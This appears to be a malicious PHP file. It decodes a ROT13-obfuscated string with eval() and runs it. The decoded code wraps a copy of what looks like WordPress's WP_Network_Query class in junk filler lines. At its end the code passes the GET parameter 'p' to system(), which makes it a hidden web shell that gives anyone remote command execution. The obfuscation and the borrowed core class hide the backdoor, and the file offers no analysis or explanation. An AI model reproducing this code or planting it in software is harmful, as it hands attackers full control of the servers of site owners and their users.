<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Argjbex NCV: JC_Argjbex_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe dhrelvat argjbexf.
 *
 * @fvapr 4.6.0
 *
 * @frr JC_Argjbex_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Argjbex_Dhrel {

	/**
	 * FDY sbe qngnonfr dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat
	 */
	choyvp $erdhrfg;

	/**
	 * FDY dhrel pynhfrf.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	cebgrpgrq $fdy_pynhfrf = neenl(
		'fryrpg'  => '',
		'sebz'    => '',
		'jurer'   => neenl(),
		'tebhcol' => '',
		'beqreol' => '',
		'yvzvgf'  => '',
	);

	/**
	 * Dhrel inef frg ol gur hfre.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $dhrel_inef;

	/**
	 * Qrsnhyg inyhrf sbe dhrel inef.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $dhrel_ine_qrsnhygf;

	/**
	 * Yvfg bs argjbexf ybpngrq ol gur dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $argjbexf;

	/**
	 * Gur nzbhag bs sbhaq argjbexf sbe gur pheerag dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine vag
	 */
	choyvp $sbhaq_argjbexf = 0;

	/**
	 * Gur ahzore bs cntrf.
	 *
	 * @fvapr 4.6.0
	 * @ine vag
	 */
	choyvp $znk_ahz_cntrf = 0;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur argjbex dhrel, onfrq ba gur dhrel inef cnffrq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat|neenl $dhrel {
	 *     Bcgvbany. Neenl be dhrel fgevat bs argjbex dhrel cnenzrgref. Qrsnhyg rzcgl.
	 *
	 *     @glcr vag[]        $argjbex__va          Neenl bs argjbex VQf gb vapyhqr. Qrsnhyg rzcgl.
	 *     @glcr vag[]        $argjbex__abg_va      Neenl bs argjbex VQf gb rkpyhqr. Qrsnhyg rzcgl.
	 *     @glcr obby         $pbhag                Jurgure gb erghea n argjbex pbhag (gehr) be neenl bs argjbex bowrpgf.
	 *                                              Qrsnhyg snyfr.
	 *     @glcr fgevat       $svryqf               Argjbex svryqf gb erghea. Npprcgf 'vqf' (ergheaf na neenl bs argjbex VQf)
	 *                                              be rzcgl (ergheaf na neenl bs pbzcyrgr argjbex bowrpgf). Qrsnhyg rzcgl.
	 *     @glcr vag          $ahzore               Znkvzhz ahzore bs argjbexf gb ergevrir. Qrsnhyg rzcgl (ab yvzvg).
	 *     @glcr vag          $bssfrg               Ahzore bs argjbexf gb bssfrg gur dhrel. Hfrq gb ohvyq YVZVG pynhfr.
	 *                                              Qrsnhyg 0.
	 *     @glcr obby         $ab_sbhaq_ebjf        Jurgure gb qvfnoyr gur `FDY_PNYP_SBHAQ_EBJF` dhrel. Qrsnhyg gehr.
	 *     @glcr fgevat|neenl $beqreol              Argjbex fgnghf be neenl bs fgnghfrf. Npprcgf 'vq', 'qbznva', 'cngu',
	 *                                              'qbznva_yratgu', 'cngu_yratgu' naq 'argjbex__va'. Nyfb npprcgf snyfr,
	 *                                              na rzcgl neenl, be 'abar' gb qvfnoyr `BEQRE OL` pynhfr. Qrsnhyg 'vq'.
	 *     @glcr fgevat       $beqre                Ubj gb beqre ergevrirq argjbexf. Npprcgf 'NFP', 'QRFP'. Qrsnhyg 'NFP'.
	 *     @glcr fgevat       $qbznva               Yvzvg erfhygf gb gubfr nssvyvngrq jvgu n tvira qbznva. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]     $qbznva__va           Neenl bs qbznvaf gb vapyhqr nssvyvngrq argjbexf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]     $qbznva__abg_va       Neenl bs qbznvaf gb rkpyhqr nssvyvngrq argjbexf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat       $cngu                 Yvzvg erfhygf gb gubfr nssvyvngrq jvgu n tvira cngu. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]     $cngu__va             Neenl bs cnguf gb vapyhqr nssvyvngrq argjbexf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]     $cngu__abg_va         Neenl bs cnguf gb rkpyhqr nssvyvngrq argjbexf sbe. Qrsnhyg rzcgl.
	 *     @glcr fgevat       $frnepu               Frnepu grez(f) gb ergevrir zngpuvat argjbexf sbe. Qrsnhyg rzcgl.
	 *     @glcr obby         $hcqngr_argjbex_pnpur Jurgure gb cevzr gur pnpur sbe sbhaq argjbexf. Qrsnhyg gehr.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $dhrel = '' ) {
		$guvf->dhrel_ine_qrsnhygf = neenl(
			'argjbex__va'          => '',
			'argjbex__abg_va'      => '',
			'pbhag'                => snyfr,
			'svryqf'               => '',
			'ahzore'               => '',
			'bssfrg'               => '',
			'ab_sbhaq_ebjf'        => gehr,
			'beqreol'              => 'vq',
			'beqre'                => 'NFP',
			'qbznva'               => '',
			'qbznva__va'           => '',
			'qbznva__abg_va'       => '',
			'cngu'                 => '',
			'cngu__va'             => '',
			'cngu__abg_va'         => '',
			'frnepu'               => '',
			'hcqngr_argjbex_pnpur' => gehr,
		);

		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->dhrel( $dhrel );
		}
	}

	/**
	 * Cnefrf nethzragf cnffrq gb gur argjbex dhrel jvgu qrsnhyg dhrel cnenzrgref.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat|neenl $dhrel JC_Argjbex_Dhrel nethzragf. Frr JC_Argjbex_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
	 */
	choyvp shapgvba cnefr_dhrel( $dhrel = '' ) {
		vs ( rzcgl( $dhrel ) ) {
			$dhrel = $guvf->dhrel_inef;
		}

		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel, $guvf->dhrel_ine_qrsnhygf );

		/**
		 * Sverf nsgre gur argjbex dhrel inef unir orra cnefrq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Argjbex_Dhrel $dhrel Gur JC_Argjbex_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cnefr_argjbex_dhrel', neenl( &$guvf ) );
	}

	/**
	 * Frgf hc gur JbeqCerff dhrel sbe ergevrivat argjbexf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat|neenl $dhrel Neenl be HEY dhrel fgevat bs cnenzrgref.
	 * @erghea neenl|vag Yvfg bs JC_Argjbex bowrpgf, n yvfg bs argjbex VQf jura 'svryqf' vf frg gb 'vqf',
	 *                   be gur ahzore bs argjbexf jura 'pbhag' vf cnffrq nf n dhrel ine.
	 */
	choyvp shapgvba dhrel( $dhrel ) {
		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel );
		erghea $guvf->trg_argjbexf();
	}

	/**
	 * Trgf n yvfg bs argjbexf zngpuvat gur dhrel inef.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea neenl|vag Yvfg bs JC_Argjbex bowrpgf, n yvfg bs argjbex VQf jura 'svryqf' vf frg gb 'vqf',
	 *                   be gur ahzore bs argjbexf jura 'pbhag' vf cnffrq nf n dhrel ine.
	 */
	choyvp shapgvba trg_argjbexf() {
		$guvf->cnefr_dhrel();

		/**
		 * Sverf orsber argjbexf ner ergevrirq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Argjbex_Dhrel $dhrel Pheerag vafgnapr bs JC_Argjbex_Dhrel (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_trg_argjbexf', neenl( &$guvf ) );

		$argjbex_qngn = ahyy;

		/**
		 * Svygref gur argjbex qngn orsber gur dhrel gnxrf cynpr.
		 *
		 * Erghea n aba-ahyy inyhr gb olcnff JbeqCerff' qrsnhyg argjbex dhrevrf.
		 *
		 * Gur rkcrpgrq erghea glcr sebz guvf svygre qrcraqf ba gur inyhr cnffrq
		 * va gur erdhrfg dhrel inef:
		 * - Jura `$guvf->dhrel_inef['pbhag']` vf frg, gur svygre fubhyq erghea
		 *   gur argjbex pbhag nf na vagrtre.
		 * - Jura `'vqf' === $guvf->dhrel_inef['svryqf']`, gur svygre fubhyq erghea
		 *   na neenl bs argjbex VQf.
		 * - Bgurejvfr gur svygre fubhyq erghea na neenl bs JC_Argjbex bowrpgf.
		 *
		 * Abgr gung vs gur svygre ergheaf na neenl bs argjbex qngn, vg jvyy or nffvtarq
		 * gb gur `argjbexf` cebcregl bs gur pheerag JC_Argjbex_Dhrel vafgnapr.
		 *
		 * Svygrevat shapgvbaf gung erdhver cntvangvba vasbezngvba ner rapbhentrq gb frg
		 * gur `sbhaq_argjbexf` naq `znk_ahz_cntrf` cebcregvrf bs gur JC_Argjbex_Dhrel bowrpg,
		 * cnffrq gb gur svygre ol ersrerapr. Vs JC_Argjbex_Dhrel qbrf abg cresbez n qngnonfr
		 * dhrel, vg jvyy abg unir rabhtu vasbezngvba gb trarengr gurfr inyhrf vgfrys.
		 *
		 * @fvapr 5.2.0
		 * @fvapr 5.6.0 Gur erghearq neenl bs argjbex qngn vf nffvtarq gb gur `argjbexf` cebcregl
		 *              bs gur pheerag JC_Argjbex_Dhrel vafgnapr.
		 *
		 * @cnenz neenl|vag|ahyy   $argjbex_qngn Erghea na neenl bs argjbex qngn gb fubeg-pvephvg JC'f argjbex dhrel,
		 *                                       gur argjbex pbhag nf na vagrtre vs `$guvf->dhrel_inef['pbhag']` vf frg,
		 *                                       be ahyy gb nyybj JC gb eha vgf abezny dhrevrf.
		 * @cnenz JC_Argjbex_Dhrel $dhrel        Gur JC_Argjbex_Dhrel vafgnapr, cnffrq ol ersrerapr.
		 */
		$argjbex_qngn = nccyl_svygref_ers_neenl( 'argjbexf_cer_dhrel', neenl( $argjbex_qngn, &$guvf ) );

		vs ( ahyy !== $argjbex_qngn ) {
			vs ( vf_neenl( $argjbex_qngn ) && ! $guvf->dhrel_inef['pbhag'] ) {
				$guvf->argjbexf = $argjbex_qngn;
			}

			erghea $argjbex_qngn;
		}

		// $netf pna vapyhqr nalguvat. Bayl hfr gur netf qrsvarq va gur dhrel_ine_qrsnhygf gb pbzchgr gur xrl.
		$_netf = jc_neenl_fyvpr_nffbp( $guvf->dhrel_inef, neenl_xrlf( $guvf->dhrel_ine_qrsnhygf ) );

		// Vtaber gur $svryqf, $hcqngr_argjbex_pnpur nethzragf nf gur dhrevrq erfhyg jvyy or gur fnzr ertneqyrff.
		hafrg( $_netf['svryqf'], $_netf['hcqngr_argjbex_pnpur'] );

		$xrl          = zq5( frevnyvmr( $_netf ) );
		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'argjbexf' );

		$pnpur_xrl   = \"trg_argjbex_vqf:$xrl:$ynfg_punatrq\";
		$pnpur_inyhr = jc_pnpur_trg( $pnpur_xrl, 'argjbex-dhrevrf' );

		vs ( snyfr === $pnpur_inyhr ) {
			$argjbex_vqf = $guvf->trg_argjbex_vqf();
			vs ( $argjbex_vqf ) {
				$guvf->frg_sbhaq_argjbexf();
			}

			$pnpur_inyhr = neenl(
				'argjbex_vqf'    => $argjbex_vqf,
				'sbhaq_argjbexf' => $guvf->sbhaq_argjbexf,
			);
			jc_pnpur_nqq( $pnpur_xrl, $pnpur_inyhr, 'argjbex-dhrevrf' );
		} ryfr {
			$argjbex_vqf          = $pnpur_inyhr['argjbex_vqf'];
			$guvf->sbhaq_argjbexf = $pnpur_inyhr['sbhaq_argjbexf'];
		}

		vs ( $guvf->sbhaq_argjbexf && $guvf->dhrel_inef['ahzore'] ) {
			$guvf->znk_ahz_cntrf = (vag) prvy( $guvf->sbhaq_argjbexf / $guvf->dhrel_inef['ahzore'] );
		}

		// Vs dhrelvat sbe n pbhag bayl, gurer'f abguvat zber gb qb.
		vs ( $guvf->dhrel_inef['pbhag'] ) {
			// $argjbex_vqf vf npghnyyl n pbhag va guvf pnfr.
			erghea (vag) $argjbex_vqf;
		}

		$argjbex_vqf = neenl_znc( 'vaginy', $argjbex_vqf );

		vs ( 'vqf' === $guvf->dhrel_inef['svryqf'] ) {
			$guvf->argjbexf = $argjbex_vqf;
			erghea $guvf->argjbexf;
		}

		vs ( $guvf->dhrel_inef['hcqngr_argjbex_pnpur'] ) {
			_cevzr_argjbex_pnpurf( $argjbex_vqf );
		}

		// Srgpu shyy argjbex bowrpgf sebz gur cevzrq pnpur.
		$_argjbexf = neenl();
		sbernpu ( $argjbex_vqf nf $argjbex_vq ) {
			$_argjbex = trg_argjbex( $argjbex_vq );
			vs ( $_argjbex ) {
				$_argjbexf[] = $_argjbex;
			}
		}

		/**
		 * Svygref gur argjbex dhrel erfhygf.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Argjbex[]     $_argjbexf Na neenl bs JC_Argjbex bowrpgf.
		 * @cnenz JC_Argjbex_Dhrel $dhrel     Pheerag vafgnapr bs JC_Argjbex_Dhrel (cnffrq ol ersrerapr).
		 */
		$_argjbexf = nccyl_svygref_ers_neenl( 'gur_argjbexf', neenl( $_argjbexf, &$guvf ) );

		// Pbaireg gb JC_Argjbex vafgnaprf.
		$guvf->argjbexf = neenl_znc( 'trg_argjbex', $_argjbexf );

		erghea $guvf->argjbexf;
	}

	/**
	 * Hfrq vagreanyyl gb trg n yvfg bs argjbex VQf zngpuvat gur dhrel inef.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea vag|neenl N fvatyr pbhag bs argjbex VQf vs n pbhag dhrel. Na neenl bs argjbex VQf vs n shyy dhrel.
	 */
	cebgrpgrq shapgvba trg_argjbex_vqf() {
		tybony $jcqo;

		$beqre = $guvf->cnefr_beqre( $guvf->dhrel_inef['beqre'] );

		// Qvfnoyr BEQRE OL jvgu 'abar', na rzcgl neenl, be obbyrna snyfr.
		vs ( va_neenl( $guvf->dhrel_inef['beqreol'], neenl( 'abar', neenl(), snyfr ), gehr ) ) {
			$beqreol = '';
		} ryfrvs ( ! rzcgl( $guvf->dhrel_inef['beqreol'] ) ) {
			$beqrefol = vf_neenl( $guvf->dhrel_inef['beqreol'] ) ?
				$guvf->dhrel_inef['beqreol'] :
				cert_fcyvg( '/[,\f]/', $guvf->dhrel_inef['beqreol'] );

			$beqreol_neenl = neenl();
			sbernpu ( $beqrefol nf $_xrl => $_inyhr ) {
				vs ( ! $_inyhr ) {
					pbagvahr;
				}

				vs ( vf_vag( $_xrl ) ) {
					$_beqreol = $_inyhr;
					$_beqre   = $beqre;
				} ryfr {
					$_beqreol = $_xrl;
					$_beqre   = $_inyhr;
				}

				$cnefrq = $guvf->cnefr_beqreol( $_beqreol );

				vs ( ! $cnefrq ) {
					pbagvahr;
				}

				vs ( 'argjbex__va' === $_beqreol ) {
					$beqreol_neenl[] = $cnefrq;
					pbagvahr;
				}

				$beqreol_neenl[] = $cnefrq . ' ' . $guvf->cnefr_beqre( $_beqre );
			}

			$beqreol = vzcybqr( ', ', $beqreol_neenl );
		} ryfr {
			$beqreol = \"$jcqo->fvgr.vq $beqre\";
		}

		$ahzore = nofvag( $guvf->dhrel_inef['ahzore'] );
		$bssfrg = nofvag( $guvf->dhrel_inef['bssfrg'] );
		$yvzvgf = '';

		vs ( ! rzcgl( $ahzore ) ) {
			vs ( $bssfrg ) {
				$yvzvgf = 'YVZVG ' . $bssfrg . ',' . $ahzore;
			} ryfr {
				$yvzvgf = 'YVZVG ' . $ahzore;
			}
		}

		vs ( $guvf->dhrel_inef['pbhag'] ) {
			$svryqf = 'PBHAG(*)';
		} ryfr {
			$svryqf = \"$jcqo->fvgr.vq\";
		}

		// Cnefr argjbex VQf sbe na VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['argjbex__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['argjbex__va'] = \"$jcqo->fvgr.vq VA ( \" . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['argjbex__va'] ) ) . ' )';
		}

		// Cnefr argjbex VQf sbe n ABG VA pynhfr.
		vs ( ! rzcgl( $guvf->dhrel_inef['argjbex__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['argjbex__abg_va'] = \"$jcqo->fvgr.vq ABG VA ( \" . vzcybqr( ',', jc_cnefr_vq_yvfg( $guvf->dhrel_inef['argjbex__abg_va'] ) ) . ' )';
		}

		vs ( ! rzcgl( $guvf->dhrel_inef['qbznva'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qbznva'] = $jcqo->cercner( \"$jcqo->fvgr.qbznva = %f\", $guvf->dhrel_inef['qbznva'] );
		}

		// Cnefr argjbex qbznva sbe na VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['qbznva__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qbznva__va'] = \"$jcqo->fvgr.qbznva VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['qbznva__va'] ) ) . \"' )\";
		}

		// Cnefr argjbex qbznva sbe n ABG VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['qbznva__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qbznva__abg_va'] = \"$jcqo->fvgr.qbznva ABG VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['qbznva__abg_va'] ) ) . \"' )\";
		}

		vs ( ! rzcgl( $guvf->dhrel_inef['cngu'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cngu'] = $jcqo->cercner( \"$jcqo->fvgr.cngu = %f\", $guvf->dhrel_inef['cngu'] );
		}

		// Cnefr argjbex cngu sbe na VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['cngu__va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cngu__va'] = \"$jcqo->fvgr.cngu VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['cngu__va'] ) ) . \"' )\";
		}

		// Cnefr argjbex cngu sbe n ABG VA pynhfr.
		vs ( vf_neenl( $guvf->dhrel_inef['cngu__abg_va'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['cngu__abg_va'] = \"$jcqo->fvgr.cngu ABG VA ( '\" . vzcybqr( \"', '\", $jcqo->_rfpncr( $guvf->dhrel_inef['cngu__abg_va'] ) ) . \"' )\";
		}

		// Snyfrl frnepu fgevatf ner vtaberq.
		vs ( fgeyra( $guvf->dhrel_inef['frnepu'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['frnepu'] = $guvf->trg_frnepu_fdy(
				$guvf->dhrel_inef['frnepu'],
				neenl( \"$jcqo->fvgr.qbznva\", \"$jcqo->fvgr.cngu\" )
			);
		}

		$wbva = '';

		$jurer = vzcybqr( ' NAQ ', $guvf->fdy_pynhfrf['jurer'] );

		$tebhcol = '';

		$cvrprf = neenl( 'svryqf', 'wbva', 'jurer', 'beqreol', 'yvzvgf', 'tebhcol' );

		/**
		 * Svygref gur argjbex dhrel pynhfrf.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz fgevat[]         $pynhfrf {
		 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
		 *
		 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
		 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
		 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
		 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
		 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
		 *     @glcr fgevat $tebhcol  Gur TEBHC OL pynhfr bs gur dhrel.
		 * }
		 * @cnenz JC_Argjbex_Dhrel $dhrel   Pheerag vafgnapr bs JC_Argjbex_Dhrel (cnffrq ol ersrerapr).
		 */
		$pynhfrf = nccyl_svygref_ers_neenl( 'argjbexf_pynhfrf', neenl( pbzcnpg( $cvrprf ), &$guvf ) );

		$svryqf  = vffrg( $pynhfrf['svryqf'] ) ? $pynhfrf['svryqf'] : '';
		$wbva    = vffrg( $pynhfrf['wbva'] ) ? $pynhfrf['wbva'] : '';
		$jurer   = vffrg( $pynhfrf['jurer'] ) ? $pynhfrf['jurer'] : '';
		$beqreol = vffrg( $pynhfrf['beqreol'] ) ? $pynhfrf['beqreol'] : '';
		$yvzvgf  = vffrg( $pynhfrf['yvzvgf'] ) ? $pynhfrf['yvzvgf'] : '';
		$tebhcol = vffrg( $pynhfrf['tebhcol'] ) ? $pynhfrf['tebhcol'] : '';

		vs ( $jurer ) {
			$jurer = 'JURER ' . $jurer;
		}

		vs ( $tebhcol ) {
			$tebhcol = 'TEBHC OL ' . $tebhcol;
		}

		vs ( $beqreol ) {
			$beqreol = \"BEQRE OL $beqreol\";
		}

		$sbhaq_ebjf = '';
		vs ( ! $guvf->dhrel_inef['ab_sbhaq_ebjf'] ) {
			$sbhaq_ebjf = 'FDY_PNYP_SBHAQ_EBJF';
		}

		$guvf->fdy_pynhfrf['fryrpg']  = \"FRYRPG $sbhaq_ebjf $svryqf\";
		$guvf->fdy_pynhfrf['sebz']    = \"SEBZ $jcqo->fvgr $wbva\";
		$guvf->fdy_pynhfrf['tebhcol'] = $tebhcol;
		$guvf->fdy_pynhfrf['beqreol'] = $beqreol;
		$guvf->fdy_pynhfrf['yvzvgf']  = $yvzvgf;

		// Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
		$guvf->erdhrfg =
			\"{$guvf->fdy_pynhfrf['fryrpg']}
			 {$guvf->fdy_pynhfrf['sebz']}
			 {$jurer}
			 {$guvf->fdy_pynhfrf['tebhcol']}
			 {$guvf->fdy_pynhfrf['beqreol']}
			 {$guvf->fdy_pynhfrf['yvzvgf']}\";

		vs ( $guvf->dhrel_inef['pbhag'] ) {
			erghea (vag) $jcqo->trg_ine( $guvf->erdhrfg );
		}

		$argjbex_vqf = $jcqo->trg_pby( $guvf->erdhrfg );

		erghea neenl_znc( 'vaginy', $argjbex_vqf );
	}

	/**
	 * Cbchyngrf sbhaq_argjbexf naq znk_ahz_cntrf cebcregvrf sbe gur pheerag dhrel
	 * vs gur yvzvg pynhfr jnf hfrq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	cevingr shapgvba frg_sbhaq_argjbexf() {
		tybony $jcqo;

		vs ( $guvf->dhrel_inef['ahzore'] && ! $guvf->dhrel_inef['ab_sbhaq_ebjf'] ) {
			/**
			 * Svygref gur dhrel hfrq gb ergevrir sbhaq argjbex pbhag.
			 *
			 * @fvapr 4.6.0
			 *
			 * @cnenz fgevat           $sbhaq_argjbexf_dhrel FDY dhrel. Qrsnhyg 'FRYRPG SBHAQ_EBJF()'.
			 * @cnenz JC_Argjbex_Dhrel $argjbex_dhrel        Gur `JC_Argjbex_Dhrel` vafgnapr.
			 */
			$sbhaq_argjbexf_dhrel = nccyl_svygref( 'sbhaq_argjbexf_dhrel', 'FRYRPG SBHAQ_EBJF()', $guvf );

			$guvf->sbhaq_argjbexf = (vag) $jcqo->trg_ine( $sbhaq_argjbexf_dhrel );
		}
	}

	/**
	 * Hfrq vagreanyyl gb trarengr na FDY fgevat sbe frnepuvat npebff zhygvcyr pbyhzaf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat   $frnepu  Frnepu fgevat.
	 * @cnenz fgevat[] $pbyhzaf Neenl bs pbyhzaf gb frnepu.
	 * @erghea fgevat Frnepu FDY.
	 */
	cebgrpgrq shapgvba trg_frnepu_fdy( $frnepu, $pbyhzaf ) {
		tybony $jcqo;

		$yvxr = '%' . $jcqo->rfp_yvxr( $frnepu ) . '%';

		$frnepurf = neenl();
		sbernpu ( $pbyhzaf nf $pbyhza ) {
			$frnepurf[] = $jcqo->cercner( \"$pbyhza YVXR %f\", $yvxr );
		}

		erghea '(' . vzcybqr( ' BE ', $frnepurf ) . ')';
	}

	/**
	 * Cnefrf naq fnavgvmrf 'beqreol' xrlf cnffrq gb gur argjbex dhrel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $beqreol Nyvnf sbe gur svryq gb beqre ol.
	 * @erghea fgevat|snyfr Inyhr gb hfrq va gur BEQRE pynhfr. Snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba cnefr_beqreol( $beqreol ) {
		tybony $jcqo;

		$nyybjrq_xrlf = neenl(
			'vq',
			'qbznva',
			'cngu',
		);

		$cnefrq = snyfr;
		vs ( 'argjbex__va' === $beqreol ) {
			$argjbex__va = vzcybqr( ',', neenl_znc( 'nofvag', $guvf->dhrel_inef['argjbex__va'] ) );
			$cnefrq      = \"SVRYQ( {$jcqo->fvgr}.vq, $argjbex__va )\";
		} ryfrvs ( 'qbznva_yratgu' === $beqreol || 'cngu_yratgu' === $beqreol ) {
			$svryq  = fhofge( $beqreol, 0, -7 );
			$cnefrq = \"PUNE_YRATGU($jcqo->fvgr.$svryq)\";
		} ryfrvs ( va_neenl( $beqreol, $nyybjrq_xrlf, gehr ) ) {
			$cnefrq = \"$jcqo->fvgr.$beqreol\";
		}

		erghea $cnefrq;
	}

	/**
	 * Cnefrf na 'beqre' dhrel inevnoyr naq pnfg vg gb 'NFP' be 'QRFP' nf arprffnel.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $beqre Gur 'beqre' dhrel inevnoyr.
	 * @erghea fgevat Gur fnavgvmrq 'beqre' dhrel inevnoyr.
	 */
	cebgrpgrq shapgvba cnefr_beqre( $beqre ) {
		vs ( ! vf_fgevat( $beqre ) || rzcgl( $beqre ) ) {
			erghea 'NFP';
		}

		vs ( 'NFP' === fgegbhccre( $beqre ) ) {
			erghea 'NFP';
		} ryfr {
			erghea 'QRFP';
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>